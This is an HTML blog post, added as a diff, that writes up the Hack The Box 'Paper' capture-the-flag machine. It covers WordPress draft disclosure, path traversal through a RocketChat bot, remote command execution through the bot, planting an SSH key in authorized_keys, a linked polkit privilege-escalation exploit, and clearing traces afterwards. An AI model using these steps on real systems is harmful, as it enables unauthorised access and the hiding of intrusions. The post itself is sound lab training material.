@@ -1,0 +1,157 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=theme-color content="#494f5c"><meta name=msapplication-TileColor content="#494f5c"><meta itemprop=name content="Hack The Box - Paper"><meta itemprop=description content="Premise As with all Hack The Box (HTB) Machines we&rsquo;re given nothing more than an IP.
+Initial target enumeration with nmap shows us TCP 22, 80, and 443 open, with SSH and Apache 2.4.37 respectively. The TLS information returned isn&rsquo;t super helpful, and hitting the website gives us nothing more than the default CentOS Apache httpd page.
+Further exploration Next step, after a lot of poking, prodding, fuzzing, etc&mldr; and getting nowhere was to try out nikto to see if there&rsquo;s anything else the webserver might be leaking for us."><meta itemprop=datePublished content="2022-04-01T00:00:00+00:00"><meta itemprop=dateModified content="2022-04-01T00:00:00+00:00"><meta itemprop=wordCount content="1207"><meta itemprop=keywords content="ctf,"><meta property="og:title" content="Hack The Box - Paper"><meta property="og:description" content="Premise As with all Hack The Box (HTB) Machines we&rsquo;re given nothing more than an IP.
+Initial target enumeration with nmap shows us TCP 22, 80, and 443 open, with SSH and Apache 2.4.37 respectively. The TLS information returned isn&rsquo;t super helpful, and hitting the website gives us nothing more than the default CentOS Apache httpd page.
+Further exploration Next step, after a lot of poking, prodding, fuzzing, etc&mldr; and getting nowhere was to try out nikto to see if there&rsquo;s anything else the webserver might be leaking for us."><meta property="og:type" content="article"><meta property="og:url" content="https://maclarel.github.io/posts/2022-04/htb_paper/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-04-01T00:00:00+00:00"><meta property="article:modified_time" content="2022-04-01T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Hack The Box - Paper"><meta name=twitter:description content="Premise As with all Hack The Box (HTB) Machines we&rsquo;re given nothing more than an IP.
+Initial target enumeration with nmap shows us TCP 22, 80, and 443 open, with SSH and Apache 2.4.37 respectively. The TLS information returned isn&rsquo;t super helpful, and hitting the website gives us nothing more than the default CentOS Apache httpd page.
+Further exploration Next step, after a lot of poking, prodding, fuzzing, etc&mldr; and getting nowhere was to try out nikto to see if there&rsquo;s anything else the webserver might be leaking for us."><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color><link rel="shortcut icon" href=/favicon.ico><title>Hack The Box - Paper</title><link rel=stylesheet href=https://maclarel.github.io/css/style.min.037b6ee8f8c1baab6a3d0a9da11c3ff18a7552471f16c59fd98538d5ce99208b.css integrity="sha256-A3tu6PjBuqtqPQqdoRw/8Yp1UkcfFsWf2YU41c6ZIIs=" crossorigin=anonymous></head><body id=page><header id=site-header class="animated slideInUp"><div class="hdr-wrapper section-inner"><div class=hdr-left><div class=site-branding><a href=https://maclarel.github.io>Logan MacLaren</a></div><nav class="site-nav hide-in-mobile"><a href=https://maclarel.github.io/posts/>Blog</a></nav></div><div class="hdr-right hdr-icons"><button id=toc-btn class="hdr-btn desktop-only-ib" title="Table of Contents"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-list"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3" y2="6"/><line x1="3" y1="12" x2="3" y2="12"/><line x1="3" y1="18" x2="3" y2="18"/></svg></button><span class="hdr-social hide-in-mobile"><a href=https://www.linkedin.com/in/loganmaclaren/ target=_blank rel="noopener me" title=Linkedin><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a><a href=https://github.com/maclarel target=_blank rel="noopener me" title=Github><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://www.youtube.com/channel/UCRoQUH8UHGi18ERXjYin8AQ target=_blank rel="noopener me" title=Youtube><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22.54 6.42a2.78 2.78.0 00-1.94-2C18.88 4 12 4 12 4s-6.88.0-8.6.46a2.78 2.78.0 00-1.94 2A29 29 0 001 11.75a29 29 0 00.46 5.33A2.78 2.78.0 003.4 19c1.72.46 8.6.46 8.6.46s6.88.0 8.6-.46a2.78 2.78.0 001.94-2 29 29 0 00.46-5.25 29 29 0 00-.46-5.33z"/><polygon points="9.75 15.02 15.5 11.75 9.75 8.48 9.75 15.02"/></svg></a></span><button id=menu-btn class=hdr-btn title=Menu><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></header><div id=mobile-menu class="animated fast"><ul><li><a href=https://maclarel.github.io/posts/>Blog</a></li></ul></div><main class="site-main section-inner animated fadeIn faster"><article class=thin><header class=post-header><div class=post-meta><span>Apr 1, 2022</span></div><h1>Hack The Box - Paper</h1></header><div class=content><h1 id=premise>Premise<a href=#premise class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>As with all Hack The Box (HTB) <code>Machines</code> we&rsquo;re given nothing more than an IP.</p><p>Initial target enumeration with <code>nmap</code> shows us TCP 22, 80, and 443 open, with SSH and Apache 2.4.37 respectively. The TLS information returned isn&rsquo;t super helpful, and hitting the website gives us nothing more than the default CentOS Apache httpd page.</p><h1 id=further-exploration>Further exploration<a href=#further-exploration class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>Next step, after a lot of poking, prodding, fuzzing, etc&mldr; and getting nowhere was to try out <code>nikto</code> to see if there&rsquo;s anything else the webserver might be leaking for us.</p><p>Fortunately there is - a potential host name of <code>office.paper</code> thanks to a <code>x-backend-server</code> header. Presumably this is for name-based virtual hosts with Apache, so let&rsquo;s add it to <code>/etc/hosts</code> with the target IP and see what we get.</p><p>Bingo. A wordpress blog.</p><h1 id=wordpress-moar-like-insecurepress-m-i-rite>wordpress? moar like insecurepress, m i rite?<a href=#wordpress-moar-like-insecurepress-m-i-rite class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>Joking aside, this is running an <em>ancient</em> version of Wordpress from back in 2019. This will become useful shortly.</p><p>From initial poking around there&rsquo;s no much of interest, other than the singular response to any of the blog posts there, and it&rsquo;s chastising the author for leaving sensitive data in drafts. Hmmm&mldr; Is there a way we can access those?</p><p><a href=https://www.exploit-db.com/exploits/47690>Yes, there is.</a>.</p><p>With this knowledge, we can just hit <a href="http://office.paper/?status=1">http://office.paper/?status=1</a> and right away we&rsquo;ve got the information we need to move to our next step - RocketChat.</p><h1 id=i-for-one-welcome-our-robot-overlords>I, for one, welcome our robot overlords<a href=#i-for-one-welcome-our-robot-overlords class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>After using the signup link from the draft, and getting access to RocketChat, there&rsquo;s some juicy info there about a chat bot that can be used to do various business things&mldr; but also, for some insane reason, to list files and get their contents. Ripe for exploitation.</p><p>We can get directory listings with <code>recyclops list sale</code> as the example, but as it turns out this also allows for relative paths.</p><pre><code>4:55 PM
+recyclops list sale/../..
+Bot
+4:55 PM
+Fetching the directory listing of sale
+total 4
+drwxr-xr-x 2 dwight dwight 27 Sep 15 2021 .
+drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 ..
+-rw-r--r-- 1 dwight dwight 158 Sep 15 2021 portfolio.txt
+Fetching the directory listing of sale/..
+total 0
+drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 .
+drwx------ 12 dwight dwight 323 Apr 1 16:26 ..
+drwxr-xr-x 2 dwight dwight 27 Sep 15 2021 sale
+drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2
+Fetching the directory listing of sale/../..
+total 64
+drwx------ 12 dwight dwight 323 Apr 1 16:26 .
+drwxr-xr-x. 3 root root 20 Jan 14 06:50 ..
+lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout
+-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile
+-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
+-rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_restart.sh
+drwx------ 5 dwight dwight 56 Jul 3 2021 .config
+-rw------- 1 dwight dwight 9 Apr 1 16:26 .dbshell
+-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth
+drwx------ 3 dwight dwight 69 Apr 1 16:26 .gnupg
+drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot
+-rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_history
+-rwxrwxr-x 1 dwight dwight 25152 Apr 1 14:22 jeTNike
+drwx------ 3 dwight dwight 19 Jul 3 2021 .local
+drwxrwxr-x 2 dwight dwight 27 Apr 1 14:22 lol
+drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
+drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
+drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
+drwx------ 2 dwight dwight 29 Apr 1 16:07 .ssh
+-r-------- 1 dwight dwight 33 Apr 1 14:12 user.txt
+drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim
+</code></pre><p>There&rsquo;s the user flag, let&rsquo;s see if we can get it.</p><pre><code>4:56 PM
+recyclops file sale/../../user.txt
+Bot
+4:56 PM
+Access denied. 
+</code></pre><p>Nope! Let&rsquo;s see what else is there.</p><p>I see a <code>bot_restart.sh</code> script. Let&rsquo;s check it with <code>recyclops file sale/../../bot_restart.sh</code></p><pre><code> &lt;!=====Contents of file sale/../../bot_restart.sh=====&gt;
+#!/bin/bash
+
+# Cleaning hubot's log so that it won't grow too large.
+echo &quot;&quot; &gt; /home/dwight/hubot/.hubot.log
+
+
+# For starting the bot 20-ish (10+20) seconds late, when the server is restarted.
+# This is because MongoDB and Rocket-Chat server needs some time to startup properly
+sleep 10s
+
+# Checks if Hubot is running every 10s
+while [ 1 ];
+do
+sleep 20s
+alive=$(/usr/sbin/ss -tulnp|grep 8000);
+if [[ -n $alive ]]; then
+err=$(grep -i 'unhandled-rejections=strict' /home/dwight/hubot/.hubot.log)
+if [[ -n $err ]]; then
+# Restarts bot
+echo &quot;[-] Bot not running!
+date&quot;;
+#Killing the old process
+pid=$(ps aux|grep -i 'hubot -a rocketchat'|grep -v grep|cut -d &quot; &quot; -f6);
+kill -9 $pid;
+cd /home/dwight/hubot;
+# Cleaning hubot's log so that it won't grow too large.
+echo &quot;&quot; &gt; /home/dwight/hubot/.hubot.log
+bash /home/dwight/hubot/start_bot.sh&amp;
+else
+
+
+echo &quot;[+] Bot running succesfully! date&quot;;
+fi
+
+else
+# Restarts bot
+echo &quot;[-] Bot not running! date
+&quot;;
+#Killing the old process
+pid=$(ps aux|grep -i 'hubot -a rocketchat'|grep -v grep|cut -d &quot; &quot; -f6);
+kill -9 $pid;
+cd /home/dwight/hubot;
+bash /home/dwight/hubot/start_bot.sh&amp;
+fi
+
+done
+&lt;!=====End of file sale/../../bot_restart.sh=====&gt;
+</code></pre><p>Ok, looks like the bot stuff is all under <code>/home/dwight/hubot</code>, let&rsquo;s see what it can do.</p><p>We can see what scripts it can run with <code>recyclops list ../hubot/scripts/</code> which shows us a <code>cmd.coffee</code>.</p><pre><code> &lt;!=====Contents of file ../hubot/scripts/cmd.coffee=====&gt;
+# Description:
+# Runs a command on hubot
+# TOTAL VIOLATION of any and all security!
+#
+# Commands:
+# hubot cmd &lt;command&gt; - runs a command on hubot host
+
+module.exports = (robot) -&gt;
+robot.respond /CMD (.*)$/i, (msg) -&gt;
+# console.log(msg)
+@exec = require('child_process').exec
+cmd = msg.match[1]
+msg.send &quot;Running [#{cmd}]...&quot;
+
+@exec cmd, (error, stdout, stderr) -&gt;
+if error
+msg.send error
+msg.send stderr
+else
+msg.send stdout
+# Description:
+# Runs a command on hubot
+# TOTAL VIOLATION of any and all security!
+#
+# Commands:
+# hubot cmd &lt;command&gt; - runs a command on hubot host
+
+module.exports = (robot) -&gt;
+robot.respond /CMD (.*)$/i, (msg) -&gt;
+# console.log(msg)
+@exec = require('child_process').exec
+cmd = msg.match[1]
+msg.send &quot;Running [#{cmd}]...&quot;
+
+@exec cmd, (error, stdout, stderr) -&gt;
+if error
+msg.send error
+msg.send stderr
+else
+msg.send stdout
+&lt;!=====End of file ../hubot/scripts/cmd.coffee=====&gt;
+</code></pre><p>What does it do? Exactly what you think&mldr; RCE, but at least it&rsquo;s scoped to a non-root user.</p><pre><code>5:02 PM
+recyclops cmd whoami
+Bot
+5:02 PM
+Running [whoami]...
+Running [whoami]...
+dwight
+dwight
+</code></pre><p>We can use this to get the <code>user.txt</code> flag as a starting point with <code>recyclops cmd cat /home/dwight/user.txt</code>:</p><pre><code> Running [cat /home/dwight/user.txt]...
+c1ff88de...
+</code></pre><h1 id=foothold--root>Foothold & <code>root</code><a href=#foothold--root class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>We can add our own public key into <code>dwight</code>&rsquo;s authorized keys with this and use that as a starting point:</p><pre><code>recyclops cmd echo ssh-rsa &lt;key goes here&gt; &gt;&gt; /home/dwight/.ssh/authorized_keys
+</code></pre><p>And we&rsquo;re in with a stable shell.</p><pre><code>[dwight@paper ~]$
+</code></pre><p><em>Note</em>: Another approach here could be use <code>recyclops</code> to spawn a reverse shell. While that <em>might</em> be better for not leaving fingerprints (literally our SSH public key), it means we have to deal with getting a stable shell from there. This is easier, and for a CTF I&rsquo;ll take that tradeoff.</p><p>Now that we&rsquo;re in, we can see that <code>dwight</code> has no <code>sudo</code> privs - prompting for a password just to run <code>sudo -l</code>, so that&rsquo;s a no go.</p><p>Let&rsquo;s just go for the gold <a href=https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py>with <code>polkit</code> sploitz</a> and see if it works.</p><p>Yep.</p><pre><code>[root@paper shm]#
+[root@paper shm]# cat /root/root.txt
+7402782...
+</code></pre><p>Time to clean up and get out - delete the <code>authorized_keys</code> entry, delete the <code>polkit</code> exploit script, and clear history.</p><p>GG!</p></div><hr class=post-end><footer class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://maclarel.github.io/tags/ctf>ctf</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>1207 Words</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>2022-04-01 00:00 +0000</p></footer></article><aside id=toc><div class=toc-title>Table of Contents</div><nav id=TableOfContents></nav></aside><div class="post-nav thin"><a class=next-post href=https://maclarel.github.io/posts/2022-04/htb_pandora/><span class=post-nav-label><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>&nbsp;Newer</span><br><span>Hack The Box - Pandora</span></a>
+<a class=prev-post href=https://maclarel.github.io/posts/2022-03/pico_notepad/><span class=post-nav-label>Older&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg></span><br><span>picoCTF - notepad</span></a></div><div id=comments class=thin></div></main><footer id=site-footer class="section-inner thin animated fadeIn faster"><p>&copy; 2022 <a href=https://maclarel.github.io>Logan MacLaren</a> &#183; <a href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank rel=noopener>CC BY-NC 4.0</a></p><p>Made with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> &#183; Theme <a href=https://github.com/Track3/hermit target=_blank rel=noopener>Hermit</a> &#183; <a href=https://maclarel.github.io/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></p></footer><script src=https://maclarel.github.io/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin=anonymous></script></body></html>
